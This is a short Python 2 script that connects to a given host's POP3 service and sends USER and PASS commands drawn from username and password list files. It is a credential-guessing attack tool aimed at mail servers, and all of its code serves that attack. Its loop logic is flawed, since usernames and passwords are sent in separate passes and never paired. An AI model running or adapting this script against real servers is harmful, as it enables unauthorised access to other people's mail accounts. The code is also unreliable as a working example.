#!/usr/bin/python
import socket
import sys

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) != 4:
	print "Usage = connect_pop3.py <target_ip> <userlist_file> <passwordlist_file>"
	sys.exit(0)

try:
	print "\nSending evil buffer..."
	s.connect((sys.argv[1],110))		# connect to IP, POP3 port
	data = s.recv(1024)			# receive banner
	print data				# print banner

	usernames_file = open(sys.argv[2])	# open username file
	
	for line in usernames_file:
		username = line.strip()		# strip lines
		s.send('USER ' + username  +'\r\n')	# send username ;ist
		data = s.recv(1024)		# receive reply
		print data			# print reply 
	
	passwords_file = open(sys.argv[3])	# open password file
	
	for lines in passwords_file:
		password = lines.strip()	# strip lines
		s.send('PASS ' +password +'\r\n')	# send password list
		data = s.recv(1024)		# receive reply
		print data			# print reply

	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"
